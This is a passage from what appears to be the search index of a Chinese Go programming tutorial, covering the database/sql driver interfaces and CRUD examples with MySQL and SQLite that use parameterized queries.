<p>Query\u51fd\u6570\u6267\u884cPrepare\u51c6\u5907\u597d\u7684sql\uff0c\u4f20\u5165\u9700\u8981\u7684\u53c2\u6570\u6267\u884cselect\u64cd\u4f5c\uff0c\u8fd4\u56deRows\u7ed3\u679c\u96c6</p>"},{"location":"05.1/#drivertx","title":"driver.Tx","text":"<p>\u4e8b\u52a1\u5904\u7406\u4e00\u822c\u5c31\u4e24\u4e2a\u8fc7\u7a0b\uff0c\u9012\u4ea4\u6216\u8005\u56de\u6eda\u3002\u6570\u636e\u5e93\u9a71\u52a8\u91cc\u9762\u4e5f\u53ea\u9700\u8981\u5b9e\u73b0\u8fd9\u4e24\u4e2a\u51fd\u6570\u5c31\u53ef\u4ee5 <pre><code>type Tx interface {\nCommit() error\nRollback() error\n}\n</code></pre> \u8fd9\u4e24\u4e2a\u51fd\u6570\u4e00\u4e2a\u7528\u6765\u9012\u4ea4\u4e00\u4e2a\u4e8b\u52a1\uff0c\u4e00\u4e2a\u7528\u6765\u56de\u6eda\u4e8b\u52a1\u3002</p>"},{"location":"05.1/#driverexecer","title":"driver.Execer","text":"<p>\u8fd9\u662f\u4e00\u4e2aConn\u53ef\u9009\u62e9\u5b9e\u73b0\u7684\u63a5\u53e3 <pre><code>type Execer interface {\nExec(query string, args []Value) (Result, error)\n}\n</code></pre> \u5982\u679c\u8fd9\u4e2a\u63a5\u53e3\u6ca1\u6709\u5b9a\u4e49\uff0c\u90a3\u4e48\u5728\u8c03\u7528DB.Exec,\u5c31\u4f1a\u9996\u5148\u8c03\u7528Prepare\u8fd4\u56deStmt\uff0c\u7136\u540e\u6267\u884cStmt\u7684Exec\uff0c\u7136\u540e\u5173\u95edStmt\u3002</p>"},{"location":"05.1/#driverresult","title":"driver.Result","text":"<p>\u8fd9\u4e2a\u662f\u6267\u884cUpdate/Insert\u7b49\u64cd\u4f5c\u8fd4\u56de\u7684\u7ed3\u679c\u63a5\u53e3\u5b9a\u4e49 <pre><code>type Result interface {\nLastInsertId() (int64, error)\nRowsAffected() (int64, error)\n}\n</code></pre> LastInsertId\u51fd\u6570\u8fd4\u56de\u7531\u6570\u636e\u5e93\u6267\u884c\u63d2\u5165\u64cd\u4f5c\u5f97\u5230\u7684\u81ea\u589eID\u53f7\u3002</p> <p>RowsAffected\u51fd\u6570\u8fd4\u56de\u6267\u884cUpdate/Insert\u7b49\u64cd\u4f5c\u5f71\u54cd\u7684\u6570\u636e\u6761\u76ee\u6570\u3002</p>"},{"location":"05.1/#driverrows","title":"driver.Rows","text":"<p>Rows\u662f\u6267\u884c\u67e5\u8be2\u8fd4\u56de\u7684\u7ed3\u679c\u96c6\u63a5\u53e3\u5b9a\u4e49 <pre><code>type Rows interface {\nColumns() []string\nClose() error\nNext(dest []Value) error\n}\n</code></pre> Columns\u51fd\u6570\u8fd4\u56de\u67e5\u8be2\u6570\u636e\u5e93\u8868\u7684\u5b57\u6bb5\u4fe1\u606f\uff0c\u8fd9\u4e2a\u8fd4\u56de\u7684slice\u548csql\u67e5\u8be2\u7684\u5b57\u6bb5\u4e00\u4e00\u5bf9\u5e94\uff0c\u800c\u4e0d\u662f\u8fd4\u56de\u6574\u4e2a\u8868\u7684\u6240\u6709\u5b57\u6bb5\u3002</p> <p>Close\u51fd\u6570\u7528\u6765\u5173\u95edRows\u8fed\u4ee3\u5668\u3002</p> <p>Next\u51fd\u6570\u7528\u6765\u8fd4\u56de\u4e0b\u4e00\u6761\u6570\u636e\uff0c\u628a\u6570\u636e\u8d4b\u503c\u7ed9dest\u3002dest\u91cc\u9762\u7684\u5143\u7d20\u5fc5\u987b\u662fdriver.Value\u7684\u503c\u9664\u4e86string\uff0c\u8fd4\u56de\u7684\u6570\u636e\u91cc\u9762\u6240\u6709\u7684string\u90fd\u5fc5\u987b\u8981\u8f6c\u6362\u6210[]byte\u3002\u5982\u679c\u6700\u540e\u6ca1\u6570\u636e\u4e86\uff0cNext\u51fd\u6570\u6700\u540e\u8fd4\u56deio.EOF\u3002</p>"},{"location":"05.1/#driverrowsaffected","title":"driver.RowsAffected","text":"<p>RowsAffected\u5176\u5b9e\u5c31\u662f\u4e00\u4e2aint64\u7684\u522b\u540d\uff0c\u4f46\u662f\u4ed6\u5b9e\u73b0\u4e86Result\u63a5\u53e3\uff0c\u7528\u6765\u5e95\u5c42\u5b9e\u73b0Result\u7684\u8868\u793a\u65b9\u5f0f <pre><code>type RowsAffected int64\n\nfunc (RowsAffected) LastInsertId() (int64, error)\n\nfunc (v RowsAffected) RowsAffected() (int64, error)\n</code></pre></p>"},{"location":"05.1/#drivervalue","title":"driver.Value","text":"<p>Value\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u7a7a\u63a5\u53e3\uff0c\u4ed6\u53ef\u4ee5\u5bb9\u7eb3\u4efb\u4f55\u7684\u6570\u636e <pre><code>type Value interface{}\n</code></pre> drive\u7684Value\u662f\u9a71\u52a8\u5fc5\u987b\u80fd\u591f\u64cd\u4f5c\u7684Value\uff0cValue\u8981\u4e48\u662fnil\uff0c\u8981\u4e48\u662f\u4e0b\u9762\u7684\u4efb\u610f\u4e00\u79cd <pre><code>int64\nfloat64\nbool\n[]byte\nstring   [*]\u9664\u4e86Rows.Next\u8fd4\u56de\u7684\u4e0d\u80fd\u662fstring.\ntime.Time\n</code></pre></p>"},{"location":"05.1/#drivervalueconverter","title":"driver.ValueConverter","text":"<p>ValueConverter\u63a5\u53e3\u5b9a\u4e49\u4e86\u5982\u4f55\u628a\u4e00\u4e2a\u666e\u901a\u7684\u503c\u8f6c\u5316\u6210driver.Value\u7684\u63a5\u53e3 <pre><code>type ValueConverter interface {\nConvertValue(v interface{}) (Value, error)\n}\n</code></pre> \u5728\u5f00\u53d1\u7684\u6570\u636e\u5e93\u9a71\u52a8\u5305\u91cc\u9762\u5b9e\u73b0\u8fd9\u4e2a\u63a5\u53e3\u7684\u51fd\u6570\u5728\u5f88\u591a\u5730\u65b9\u4f1a\u4f7f\u7528\u5230\uff0c\u8fd9\u4e2aValueConverter\u6709\u5f88\u591a\u597d\u5904\uff1a</p> <ul> <li>\u8f6c\u5316driver.value\u5230\u6570\u636e\u5e93\u8868\u76f8\u5e94\u7684\u5b57\u6bb5\uff0c\u4f8b\u5982int64\u7684\u6570\u636e\u5982\u4f55\u8f6c\u5316\u6210\u6570\u636e\u5e93\u8868uint16\u5b57\u6bb5</li> <li>\u628a\u6570\u636e\u5e93\u67e5\u8be2\u7ed3\u679c\u8f6c\u5316\u6210driver.Value\u503c</li> <li>\u5728scan\u51fd\u6570\u91cc\u9762\u5982\u4f55\u628adriver.Value\u503c\u8f6c\u5316\u6210\u7528\u6237\u5b9a\u4e49\u7684\u503c</li> </ul>"},{"location":"05.1/#drivervaluer","title":"driver.Valuer","text":"<p>Valuer\u63a5\u53e3\u5b9a\u4e49\u4e86\u8fd4\u56de\u4e00\u4e2adriver.Value\u7684\u65b9\u5f0f <pre><code>type Valuer interface {\nValue() (Value, error)\n}\n</code></pre> \u5f88\u591a\u7c7b\u578b\u90fd\u5b9e\u73b0\u4e86\u8fd9\u4e2aValue\u65b9\u6cd5\uff0c\u7528\u6765\u81ea\u8eab\u4e0edriver.Value\u7684\u8f6c\u5316\u3002</p> <p>\u901a\u8fc7\u4e0a\u9762\u7684\u8bb2\u89e3\uff0c\u4f60\u5e94\u8be5\u5bf9\u4e8e\u9a71\u52a8\u7684\u5f00\u53d1\u6709\u4e86\u4e00\u4e2a\u57fa\u672c\u7684\u4e86\u89e3\uff0c\u4e00\u4e2a\u9a71\u52a8\u53ea\u8981\u5b9e\u73b0\u4e86\u8fd9\u4e9b\u63a5\u53e3\u5c31\u80fd\u5b8c\u6210\u589e\u5220\u67e5\u6539\u7b49\u57fa\u672c\u64cd\u4f5c\u4e86\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u4e0e\u76f8\u5e94\u7684\u6570\u636e\u5e93\u8fdb\u884c\u6570\u636e\u4ea4\u4e92\u7b49\u7ec6\u8282\u95ee\u9898\u4e86\uff0c\u5728\u6b64\u4e0d\u518d\u8d58\u8ff0\u3002</p>"},{"location":"05.1/#databasesql","title":"database/sql","text":"<p>database/sql\u5728database/sql/driver\u63d0\u4f9b\u7684\u63a5\u53e3\u57fa\u7840\u4e0a\u5b9a\u4e49\u4e86\u4e00\u4e9b\u66f4\u9ad8\u9636\u7684\u65b9\u6cd5\uff0c\u7528\u4ee5\u7b80\u5316\u6570\u636e\u5e93\u64cd\u4f5c,\u540c\u65f6\u5185\u90e8\u8fd8\u5efa\u8bae\u6027\u5730\u5b9e\u73b0\u4e00\u4e2aconn pool\u3002 <pre><code>type DB struct {\ndriver   driver.Driver\ndsn      string\nmu       sync.Mutex // protects freeConn and closed\nfreeConn []driver.Conn\nclosed   bool\n}\n</code></pre> \u6211\u4eec\u53ef\u4ee5\u770b\u5230Open\u51fd\u6570\u8fd4\u56de\u7684\u662fDB\u5bf9\u8c61\uff0c\u91cc\u9762\u6709\u4e00\u4e2afreeConn\uff0c\u5b83\u5c31\u662f\u90a3\u4e2a\u7b80\u6613\u7684\u8fde\u63a5\u6c60\u3002\u5b83\u7684\u5b9e\u73b0\u76f8\u5f53\u7b80\u5355\u6216\u8005\u8bf4\u7b80\u964b\uff0c\u5c31\u662f\u5f53\u6267\u884c<code>db.prepare</code> -&gt; <code>db.prepareDC</code>\u7684\u65f6\u5019\u4f1a<code>defer dc.releaseConn</code>\uff0c\u7136\u540e\u8c03\u7528<code>db.putConn</code>\uff0c\u4e5f\u5c31\u662f\u628a\u8fd9\u4e2a\u8fde\u63a5\u653e\u5165\u8fde\u63a5\u6c60\uff0c\u6bcf\u6b21\u8c03\u7528<code>db.conn</code>\u7684\u65f6\u5019\u4f1a\u5148\u5224\u65adfreeConn\u7684\u957f\u5ea6\u662f\u5426\u5927\u4e8e0\uff0c\u5927\u4e8e0\u8bf4\u660e\u6709\u53ef\u4ee5\u590d\u7528\u7684conn\uff0c\u76f4\u63a5\u62ff\u51fa\u6765\u7528\u5c31\u662f\u4e86\uff0c\u5982\u679c\u4e0d\u5927\u4e8e0\uff0c\u5219\u521b\u5efa\u4e00\u4e2aconn\uff0c\u7136\u540e\u518d\u8fd4\u56de\u4e4b\u3002</p>"},{"location":"05.1/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u8bbf\u95ee\u6570\u636e\u5e93</li> <li>\u4e0b\u4e00\u8282: \u4f7f\u7528MySQL\u6570\u636e\u5e93</li> </ul>"},{"location":"05.2/","title":"5.2 \u4f7f\u7528MySQL\u6570\u636e\u5e93","text":"<p>\u76ee\u524dInternet\u4e0a\u6d41\u884c\u7684\u7f51\u7ad9\u6784\u67b6\u65b9\u5f0f\u662fLAMP\uff0c\u5176\u4e2d\u7684M\u5373MySQL, \u4f5c\u4e3a\u6570\u636e\u5e93\uff0cMySQL\u4ee5\u514d\u8d39\u3001\u5f00\u6e90\u3001\u4f7f\u7528\u65b9\u4fbf\u4e3a\u4f18\u52bf\u6210\u4e3a\u4e86\u5f88\u591aWeb\u5f00\u53d1\u7684\u540e\u7aef\u6570\u636e\u5e93\u5b58\u50a8\u5f15\u64ce\u3002</p>"},{"location":"05.2/#mysql","title":"MySQL\u9a71\u52a8","text":"<p>Go\u4e2d\u652f\u6301MySQL\u7684\u9a71\u52a8\u76ee\u524d\u6bd4\u8f83\u591a\uff0c\u6709\u5982\u4e0b\u51e0\u79cd\uff0c\u6709\u4e9b\u662f\u652f\u6301database/sql\u6807\u51c6\uff0c\u800c\u6709\u4e9b\u662f\u91c7\u7528\u4e86\u81ea\u5df1\u7684\u5b9e\u73b0\u63a5\u53e3,\u5e38\u7528\u7684\u6709\u5982\u4e0b\u51e0\u79cd:</p> <ul> <li>https://github.com/go-sql-driver/mysql  \u652f\u6301database/sql\uff0c\u5168\u90e8\u91c7\u7528go\u5199\u3002</li> <li>https://github.com/ziutek/mymysql   \u652f\u6301database/sql\uff0c\u4e5f\u652f\u6301\u81ea\u5b9a\u4e49\u7684\u63a5\u53e3\uff0c\u5168\u90e8\u91c7\u7528go\u5199\u3002</li> <li>https://github.com/Philio/GoMySQL \u4e0d\u652f\u6301database/sql\uff0c\u81ea\u5b9a\u4e49\u63a5\u53e3\uff0c\u5168\u90e8\u91c7\u7528go\u5199\u3002</li> </ul> <p>\u63a5\u4e0b\u6765\u7684\u4f8b\u5b50\u6211\u4e3b\u8981\u4ee5\u7b2c\u4e00\u4e2a\u9a71\u52a8\u4e3a\u4f8b(\u6211\u76ee\u524d\u9879\u76ee\u4e2d\u4e5f\u662f\u91c7\u7528\u5b83\u6765\u9a71\u52a8)\uff0c\u4e5f\u63a8\u8350\u5927\u5bb6\u91c7\u7528\u5b83\uff0c\u4e3b\u8981\u7406\u7531\uff1a</p> <ul> <li>\u8fd9\u4e2a\u9a71\u52a8\u6bd4\u8f83\u65b0\uff0c\u7ef4\u62a4\u7684\u6bd4\u8f83\u597d</li> <li>\u5b8c\u5168\u652f\u6301database/sql\u63a5\u53e3</li> <li>\u652f\u6301keepalive\uff0c\u4fdd\u6301\u957f\u8fde\u63a5,\u867d\u7136\u661f\u661ffork\u7684mymysql\u4e5f\u652f\u6301keepalive\uff0c\u4f46\u4e0d\u662f\u7ebf\u7a0b\u5b89\u5168\u7684\uff0c\u8fd9\u4e2a\u4ece\u5e95\u5c42\u5c31\u652f\u6301\u4e86keepalive\u3002</li> </ul>"},{"location":"05.2/#_1","title":"\u793a\u4f8b\u4ee3\u7801","text":"<p>\u63a5\u4e0b\u6765\u7684\u51e0\u4e2a\u5c0f\u8282\u91cc\u9762\u6211\u4eec\u90fd\u5c06\u91c7\u7528\u540c\u4e00\u4e2a\u6570\u636e\u5e93\u8868\u7ed3\u6784\uff1a\u6570\u636e\u5e93test\uff0c\u7528\u6237\u8868userinfo\uff0c\u5173\u8054\u7528\u6237\u4fe1\u606f\u8868userdetail\u3002 <pre><code>CREATE TABLE `userinfo` (\n`uid` INT(10) NOT NULL AUTO_INCREMENT,\n`username` VARCHAR(64) NULL DEFAULT NULL,\n`department` VARCHAR(64) NULL DEFAULT NULL,\n`created` DATE NULL DEFAULT NULL,\nPRIMARY KEY (`uid`)\n);\n\nCREATE TABLE `userdetail` (\n`uid` INT(10) NOT NULL DEFAULT '0',\n`intro` TEXT NULL,\n`profile` TEXT NULL,\nPRIMARY KEY (`uid`)\n)\n</code></pre> \u5982\u4e0b\u793a\u4f8b\u5c06\u793a\u8303\u5982\u4f55\u4f7f\u7528database/sql\u63a5\u53e3\u5bf9\u6570\u636e\u5e93\u8868\u8fdb\u884c\u589e\u5220\u6539\u67e5\u64cd\u4f5c <pre><code>package main\n\nimport (\n\"database/sql\"\n\"fmt\"\n//\"time\"\n\n_ \"github.com/go-sql-driver/mysql\"\n)\n\nfunc main() {\ndb, err := sql.Open(\"mysql\", \"astaxie:astaxie@/test?charset=utf8\")\ncheckErr(err)\n\n//\u63d2\u5165\u6570\u636e\nstmt, err := db.Prepare(\"INSERT INTO userinfo SET username=?,department=?,created=?\")\ncheckErr(err)\n\nres, err := stmt.Exec(\"astaxie\", \"\u7814\u53d1\u90e8\u95e8\", \"2012-12-09\")\ncheckErr(err)\n\nid, err := res.LastInsertId()\ncheckErr(err)\n\nfmt.Println(id)\n//\u66f4\u65b0\u6570\u636e\nstmt, err = db.Prepare(\"update userinfo set username=? where uid=?\")\ncheckErr(err)\n\nres, err = stmt.Exec(\"astaxieupdate\", id)\ncheckErr(err)\n\naffect, err := res.RowsAffected()\ncheckErr(err)\n\nfmt.Println(affect)\n\n//\u67e5\u8be2\u6570\u636e\nrows, err := db.Query(\"SELECT * FROM userinfo\")\ncheckErr(err)\n\nfor rows.Next() {\nvar uid int\nvar username string\nvar department string\nvar created string\nerr = rows.Scan(&amp;uid, &amp;username, &amp;department, &amp;created)\ncheckErr(err)\nfmt.Println(uid)\nfmt.Println(username)\nfmt.Println(department)\nfmt.Println(created)\n}\n\n//\u5220\u9664\u6570\u636e\nstmt, err = db.Prepare(\"delete from userinfo where uid=?\")\ncheckErr(err)\n\nres, err = stmt.Exec(id)\ncheckErr(err)\n\naffect, err = res.RowsAffected()\ncheckErr(err)\n\nfmt.Println(affect)\n\ndb.Close()\n\n}\n\nfunc checkErr(err error) {\nif err != nil {\npanic(err)\n}\n}\n</code></pre></p> <p>\u901a\u8fc7\u4e0a\u9762\u7684\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0cGo\u64cd\u4f5cMysql\u6570\u636e\u5e93\u662f\u5f88\u65b9\u4fbf\u7684\u3002</p> <p>\u5173\u952e\u7684\u51e0\u4e2a\u51fd\u6570\u6211\u89e3\u91ca\u4e00\u4e0b\uff1a</p> <p>sql.Open()\u51fd\u6570\u7528\u6765\u6253\u5f00\u4e00\u4e2a\u6ce8\u518c\u8fc7\u7684\u6570\u636e\u5e93\u9a71\u52a8\uff0cgo-sql-driver\u4e2d\u6ce8\u518c\u4e86mysql\u8fd9\u4e2a\u6570\u636e\u5e93\u9a71\u52a8\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662fDSN(Data Source Name)\uff0c\u5b83\u662fgo-sql-driver\u5b9a\u4e49\u7684\u4e00\u4e9b\u6570\u636e\u5e93\u94fe\u63a5\u548c\u914d\u7f6e\u4fe1\u606f\u3002\u5b83\u652f\u6301\u5982\u4e0b\u683c\u5f0f\uff1a</p> <pre><code>user@unix(/path/to/socket)/dbname?charset=utf8\nuser:password@tcp(localhost:5555)/dbname?charset=utf8\nuser:password@/dbname\nuser:password@tcp([de:ad:be:ef::ca:fe]:80)/dbname\n</code></pre> <p>db.Prepare()\u51fd\u6570\u7528\u6765\u8fd4\u56de\u51c6\u5907\u8981\u6267\u884c\u7684sql\u64cd\u4f5c\uff0c\u7136\u540e\u8fd4\u56de\u51c6\u5907\u5b8c\u6bd5\u7684\u6267\u884c\u72b6\u6001\u3002</p> <p>db.Query()\u51fd\u6570\u7528\u6765\u76f4\u63a5\u6267\u884cSql\u8fd4\u56deRows\u7ed3\u679c\u3002</p> <p>stmt.Exec()\u51fd\u6570\u7528\u6765\u6267\u884cstmt\u51c6\u5907\u597d\u7684SQL\u8bed\u53e5</p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u4f20\u5165\u7684\u53c2\u6570\u90fd\u662f=?\u5bf9\u5e94\u7684\u6570\u636e\uff0c\u8fd9\u6837\u505a\u7684\u65b9\u5f0f\u53ef\u4ee5\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u6b62SQL\u6ce8\u5165\u3002</p>"},{"location":"05.2/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: database/sql\u63a5\u53e3</li> <li>\u4e0b\u4e00\u8282: \u4f7f\u7528SQLite\u6570\u636e\u5e93</li> </ul>"},{"location":"05.3/","title":"5.3 \u4f7f\u7528SQLite\u6570\u636e\u5e93","text":"<p>SQLite \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u5d4c\u5165\u5f0f\u5173\u7cfb\u6570\u636e\u5e93\uff0c\u5b9e\u73b0\u81ea\u5305\u5bb9\u3001\u96f6\u914d\u7f6e\u3001\u652f\u6301\u4e8b\u52a1\u7684SQL\u6570\u636e\u5e93\u5f15\u64ce\u3002\u5176\u7279\u70b9\u662f\u9ad8\u5ea6\u4fbf\u643a\u3001\u4f7f\u7528\u65b9\u4fbf\u3001\u7ed3\u6784\u7d27\u51d1\u3001\u9ad8\u6548\u3001\u53ef\u9760\u3002 \u4e0e\u5176\u4ed6\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u4e0d\u540c\uff0cSQLite \u7684\u5b89\u88c5\u548c\u8fd0\u884c\u975e\u5e38\u7b80\u5355\uff0c\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b,\u53ea\u8981\u786e\u4fddSQLite\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5b58\u5728\u5373\u53ef\u5f00\u59cb\u521b\u5efa\u3001\u8fde\u63a5\u548c\u4f7f\u7528\u6570\u636e\u5e93\u3002\u5982\u679c\u60a8\u6b63\u5728\u5bfb\u627e\u4e00\u4e2a\u5d4c\u5165\u5f0f\u6570\u636e\u5e93\u9879\u76ee\u6216\u89e3\u51b3\u65b9\u6848\uff0cSQLite\u662f\u7edd\u5bf9\u503c\u5f97\u8003\u8651\u3002SQLite\u53ef\u4ee5\u8bf4\u662f\u5f00\u6e90\u7684Access\u3002</p>"},{"location":"05.3/#_1","title":"\u9a71\u52a8","text":"<p>Go\u652f\u6301sqlite\u7684\u9a71\u52a8\u4e5f\u6bd4\u8f83\u591a\uff0c\u4f46\u662f\u597d\u591a\u90fd\u662f\u4e0d\u652f\u6301database/sql\u63a5\u53e3\u7684</p> <ul> <li>https://github.com/mattn/go-sqlite3 \u652f\u6301database/sql\u63a5\u53e3\uff0c\u57fa\u4e8ecgo(\u5173\u4e8ecgo\u7684\u77e5\u8bc6\u8bf7\u53c2\u770b\u5b98\u65b9\u6587\u6863\u6216\u8005\u672c\u4e66\u540e\u9762\u7684\u7ae0\u8282)\u5199\u7684</li> <li>https://github.com/feyeleanor/gosqlite3 \u4e0d\u652f\u6301database/sql\u63a5\u53e3\uff0c\u57fa\u4e8ecgo\u5199\u7684</li> <li>https://github.com/phf/go-sqlite3  \u4e0d\u652f\u6301database/sql\u63a5\u53e3\uff0c\u57fa\u4e8ecgo\u5199\u7684</li> </ul> <p>\u76ee\u524d\u652f\u6301database/sql\u7684SQLite\u6570\u636e\u5e93\u9a71\u52a8\u53ea\u6709\u7b2c\u4e00\u4e2a\uff0c\u6211\u76ee\u524d\u4e5f\u662f\u91c7\u7528\u5b83\u6765\u5f00\u53d1\u9879\u76ee\u7684\u3002\u91c7\u7528\u6807\u51c6\u63a5\u53e3\u6709\u5229\u4e8e\u4ee5\u540e\u51fa\u73b0\u66f4\u597d\u7684\u9a71\u52a8\u7684\u65f6\u5019\u505a\u8fc1\u79fb\u3002</p>"},{"location":"05.3/#_2","title":"\u5b9e\u4f8b\u4ee3\u7801","text":"<p>\u793a\u4f8b\u7684\u6570\u636e\u5e93\u8868\u7ed3\u6784\u5982\u4e0b\u6240\u793a\uff0c\u76f8\u5e94\u7684\u5efa\u8868SQL\uff1a <pre><code>CREATE TABLE `userinfo` (\n`uid` INTEGER PRIMARY KEY AUTOINCREMENT,\n`username` VARCHAR(64) NULL,\n`department` VARCHAR(64) NULL,\n`created` DATE NULL\n);\n\nCREATE TABLE `userdetail` (\n`uid` INT(10) NULL,\n`intro` TEXT NULL,\n`profile` TEXT NULL,\nPRIMARY KEY (`uid`)\n);\n</code></pre> \u770b\u4e0b\u9762Go\u7a0b\u5e8f\u662f\u5982\u4f55\u64cd\u4f5c\u6570\u636e\u5e93\u8868\u6570\u636e:\u589e\u5220\u6539\u67e5 <pre><code>package main\n\nimport (\n\"database/sql\"\n\"fmt\"\n\"time\"\n\n_ \"github.com/mattn/go-sqlite3\"\n)\n\nfunc main() {\ndb, err := sql.Open(\"sqlite3\", \"./foo.db\")\ncheckErr(err)\n\n//\u63d2\u5165\u6570\u636e\nstmt, err := db.Prepare(\"INSERT INTO userinfo(username, department, created) values(?,?,?)\")\ncheckErr(err)\n\nres, err := stmt.Exec(\"astaxie\", \"\u7814\u53d1\u90e8\u95e8\", \"2012-12-09\")\ncheckErr(err)\n\nid, err := res.LastInsertId()\ncheckErr(err)\n\nfmt.Println(id)\n//\u66f4\u65b0\u6570\u636e\nstmt, err = db.Prepare(\"update userinfo set username=? where uid=?\")\ncheckErr(err)\n\nres, err = stmt.Exec(\"astaxieupdate\", id)\ncheckErr(err)\n\naffect, err := res.RowsAffected()\ncheckErr(err)\n\nfmt.Println(affect)\n\n//\u67e5\u8be2\u6570\u636e\nrows, err := db.Query(\"SELECT * FROM userinfo\")\ncheckErr(err)\n\nfor rows.Next() {\nvar uid int\nvar username string\nvar department string\nvar created time.Time\nerr = rows.Scan(&amp;uid, &amp;username, &amp;department, &amp;created)\ncheckErr(err)\nfmt.Println(uid)\nfmt.Println(username)\nfmt.Println(department)\nfmt.Println(created)\n}\n\n//\u5220\u9664\u6570\u636e\nstmt, err = db.Prepare(\"delete from userinfo where uid=?\")\ncheckErr(err)\n\nres, err = stmt.Exec(id)\ncheckErr(err)\n\naffect, err = res.RowsAffected()\ncheckErr(err)\n\nfmt.Println(affect)\n\ndb.Close()\n\n}\n\nfunc checkErr(err error) {\nif err != nil {\npanic(err)\n}\n}\n</code></pre></p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e0a\u9762\u7684\u4ee3\u7801\u548cMySQL\u4f8b\u5b50\u91cc\u9762\u7684\u4ee3\u7801\u51e0\u4e4e\u662f\u4e00\u6a21\u4e00\u6837\u7684\uff0c\u552f\u4e00\u6539\u53d8\u7684\u5c31\u662f\u5bfc\u5165\u7684\u9a71\u52a8\u6539\u53d8\u4e86\uff0c\u7136\u540e\u8c03\u7528<code>sql.Open</code>\u662f\u91c7\u7528\u4e86SQLite\u7684\u65b9\u5f0f\u6253\u5f00\u3002</p> <p>sqlite\u7ba1\u7406\u5de5\u5177\uff1ahttp://sqliteadmin.orbmu2k.de/</p> <p>\u53ef\u4ee5\u65b9\u4fbf\u7684\u65b0\u5efa\u6570\u636e\u5e93\u7ba1\u7406\u3002</p>"},{"location":"05.3/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u4f7f\u7528MySQL\u6570\u636e\u5e93</li> <li>\u4e0b\u4e00\u8282: \u4f7f\u7528PostgreSQL\u6570\u636e\u5e93</li> </ul>"},{"location":"05.4/","title":"5.4 \u4f7f\u7528PostgreSQL\u6570\u636e\u5e93","text":"<p>PostgreSQL \u662f\u4e00\u4e2a\u81ea\u7531\u7684\u5bf9\u8c61-\u5173\u7cfb\u6570\u636e\u5e93\u670d\u52a1\u5668(\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf)\uff0c\u5b83\u5728\u7075\u6d3b\u7684 BSD-\u98ce\u683c\u8bb8\u53ef\u8bc1\u4e0b\u53d1\u884c\u3002\u5b83\u63d0\u4f9b\u4e86\u76f8\u5bf9\u5176\u4ed6\u5f00\u653e\u6e90\u4ee3\u7801\u6570\u636e\u5e93\u7cfb\u7edf(\u6bd4\u5982 MySQL \u548c Firebird)\uff0c\u548c\u5bf9\u4e13\u6709\u7cfb\u7edf\u6bd4\u5982 Oracle\u3001Sybase\u3001IBM \u7684 DB2 \u548c Microsoft SQL Server\u7684\u4e00\u79cd\u9009\u62e9\u3002</p> <p>PostgreSQL\u548cMySQL\u6bd4\u8f83\uff0c\u5b83\u66f4\u52a0\u5e9e\u5927\u4e00\u70b9\uff0c\u56e0\u4e3a\u5b83\u662f\u7528\u6765\u66ff\u4ee3Oracle\u800c\u8bbe\u8ba1\u7684\u3002\u6240\u4ee5\u5728\u4f01\u4e1a\u5e94\u7528\u4e2d\u91c7\u7528PostgreSQL\u662f\u4e00\u4e2a\u660e\u667a\u7684\u9009\u62e9\u3002</p> <p>MySQL\u88abOracle\u6536\u8d2d\u4e4b\u540e\u6b63\u5728\u9010\u6b65\u7684\u5c01\u95ed\uff08\u81eaMySQL 5.5.31\u4ee5\u540e\u7684\u6240\u6709\u7248\u672c\u5c06\u4e0d\u518d\u9075\u5faaGPL\u534f\u8bae\uff09\uff0c\u9274\u4e8e\u6b64\uff0c\u5c06\u6765\u6211\u4eec\u4e5f\u8bb8\u4f1a\u9009\u62e9PostgreSQL\u800c\u4e0d\u662fMySQL\u4f5c\u4e3a\u9879\u76ee\u7684\u540e\u7aef\u6570\u636e\u5e93\u3002</p>"},{"location":"05.4/#_1","title":"\u9a71\u52a8","text":"<p>Go\u5b9e\u73b0\u7684\u652f\u6301PostgreSQL\u7684\u9a71\u52a8\u4e5f\u5f88\u591a\uff0c\u56e0\u4e3a\u56fd\u5916\u5f88\u591a\u4eba\u5728\u5f00\u53d1\u4e2d\u4f7f\u7528\u4e86\u8fd9\u4e2a\u6570\u636e\u5e93\u3002</p> <ul> <li>https://github.com/lib/pq \u652f\u6301database/sql\u9a71\u52a8\uff0c\u7eafGo\u5199\u7684</li> <li>https://github.com/jbarham/gopgsqldriver \u652f\u6301database/sql\u9a71\u52a8\uff0c\u7eafGo\u5199\u7684</li> <li>https://github.com/lxn/go-pgsql \u652f\u6301database/sql\u9a71\u52a8\uff0c\u7eafGo\u5199\u7684</li> </ul> <p>\u5728\u4e0b\u9762\u7684\u793a\u4f8b\u4e2d\u6211\u91c7\u7528\u4e86\u7b2c\u4e00\u4e2a\u9a71\u52a8\uff0c\u56e0\u4e3a\u5b83\u76ee\u524d\u4f7f\u7528\u7684\u4eba\u6700\u591a\uff0c\u5728GitHub\u4e0a\u4e5f\u6bd4\u8f83\u6d3b\u8dc3\u3002</p>"},{"location":"05.4/#_2","title":"\u5b9e\u4f8b\u4ee3\u7801","text":"<p>\u6570\u636e\u5e93\u5efa\u8868\u8bed\u53e5\uff1a <pre><code>CREATE TABLE userinfo\n(\nuid serial NOT NULL,\nusername character varying(100) NOT NULL,\ndepartment character varying(500) NOT NULL,\nCreated date,\nCONSTRAINT userinfo_pkey PRIMARY KEY (uid)\n)\nWITH (OIDS=FALSE);\n\nCREATE TABLE userdetail\n(\nuid integer,\nintro character varying(100),\nprofile character varying(100)\n)\nWITH(OIDS=FALSE);\n</code></pre> \u770b\u4e0b\u9762\u8fd9\u4e2aGo\u5982\u4f55\u64cd\u4f5c\u6570\u636e\u5e93\u8868\u6570\u636e:\u589e\u5220\u6539\u67e5</p> <pre><code>package main\n\nimport 